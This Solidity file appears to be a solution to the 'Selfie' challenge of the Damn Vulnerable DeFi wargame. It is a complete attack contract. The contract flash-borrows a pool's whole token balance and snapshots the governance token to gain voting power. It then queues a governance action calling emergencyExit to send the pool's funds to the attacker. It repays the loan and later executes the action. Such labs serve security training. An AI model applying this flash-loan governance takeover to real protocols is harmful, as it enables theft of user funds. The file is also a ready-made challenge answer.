// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackSelfie {
    SelfiePool pool;
    ISimpleGovernance gov;
    DamnValuableTokenSnapshot itoken;
    uint actionId;

    constructor(address _gov, address _pool, address _token) {
        pool = SelfiePool(_pool);
        gov = ISimpleGovernance(_gov);
        itoken = DamnValuableTokenSnapshot(_token);
    }

    function attack(bytes calldata _data) public {
        uint256 balance = itoken.balanceOf(address(pool));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(itoken),
            balance,
            _data
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        itoken.snapshot();
        actionId = gov.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", tx.origin)
        );
        itoken.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        gov.executeAction(actionId);
    }
}
